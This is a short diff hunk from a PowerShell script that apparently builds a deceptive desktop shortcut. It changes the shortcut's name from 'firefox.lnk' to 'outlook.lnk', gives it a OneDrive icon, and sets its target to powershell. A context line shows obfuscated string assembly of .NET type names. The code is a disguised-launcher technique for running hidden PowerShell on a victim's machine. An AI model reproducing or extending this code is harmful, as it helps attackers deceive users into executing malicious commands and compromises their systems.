@@ -33,7 +33,7 @@ $final = ' [text.encoding]::ascii.getstring([type].'+$strings[0]+'.'+$strings[1]
 
 #making the lnk
 $WshShell = New-Object -comObject WScript.Shell
-$Shortcut = $WshShell.CreateShortcut("C:\Users\"+$env:USERNAME+"\Desktop\firefox.lnk")
+$Shortcut = $WshShell.CreateShortcut("C:\Users\"+$env:USERNAME+"\Desktop\outlook.lnk")
 $Shortcut.RelativePath =  "powershell"
 $Shortcut.IconLocation = "C:\Windows\SysWOW64\OneDrive.ico"
 $Shortcut.TargetPath = "powershell"
